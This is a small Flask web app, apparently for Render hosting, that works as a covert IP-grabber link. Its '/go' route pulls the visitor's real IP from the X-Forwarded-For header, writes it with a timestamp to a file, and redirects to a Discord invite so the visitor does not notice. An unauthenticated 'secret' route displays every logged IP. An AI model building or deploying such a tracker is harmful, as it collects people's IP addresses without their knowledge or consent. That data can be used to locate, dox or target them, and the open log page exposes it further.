from flask import Flask, request, redirect
from datetime import datetime, timedelta
import os

app = Flask(__name__)

# Function to write to the log file
def log_ip(ip):
    # Render servers use UTC. Adding 8 hours converts it to Philippine Time.
    ph_time = datetime.utcnow() + timedelta(hours=8)
    # Format the time for easier reading (12-hour format with AM/PM)
    timestamp = ph_time.strftime('%Y-%m-%d %I:%M:%S %p')
    
    # Note: 'ips.txt' is deleted every time Render restarts or redeploys
    with open("ips.txt", "a") as f:
        f.write(f"{timestamp} - {ip}\n")

@app.route('/')
def home():
    return "Server is running!"

@app.route('/go')
def track():
    # 1. Try to get the raw string from the environment
    # This bypasses Flask's automatic processing
    forwarded_data = request.environ.get('HTTP_X_FORWARDED_FOR', '')
    
    if forwarded_data:
        # 2. Render's list looks like: "USER_IP, PROXY_IP, PROXY_IP"
        # We take the FIRST one.
        ip = forwarded_data.split(',')[0].strip()
    else:
        # 3. If that is empty, check X-Real-IP or remote_addr
        ip = request.headers.get('X-Real-IP', request.remote_addr)

    # 4. If we STILL get a Render IP (209.35...), something is wrong with the header.
    # Let's log 'Check Header' so we know it failed to find your IP.
    if ip.startswith('209.35'):
        ip = f"Render-Proxy-Detected: {ip}"

    log_ip(ip)
    return redirect("https://discord.gg/TMKATk684K")

# Secret route to view your logs in the browser
@app.route('/my-secret-logs')
def show_logs():
    if os.path.exists("ips.txt"):
        with open("ips.txt", "r") as f:
            # Using <pre> keeps the formatting clean in the browser
            return f"<pre>{f.read()}</pre>"
    return "No logs captured yet!"

if __name__ == '__main__':
    # Dynamic port binding for Render
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)